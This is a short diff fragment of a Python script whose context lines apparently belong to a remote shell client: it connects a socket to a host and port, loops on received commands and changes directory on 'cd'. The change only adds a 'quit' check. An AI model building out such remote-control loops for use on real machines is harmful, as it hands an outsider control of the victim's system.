@@ -12,6 +12,9 @@ s.connect((host,port))
 while True:
 	get_resp = s.recv(4096)
 
+	if get_resp.decode("UTF-8") == "quit":
+		break
+
 	if get_resp[:2].decode("UTF-8") == "cd":
 		os.chdir(get_resp[3:].decode("utf-8"))
 
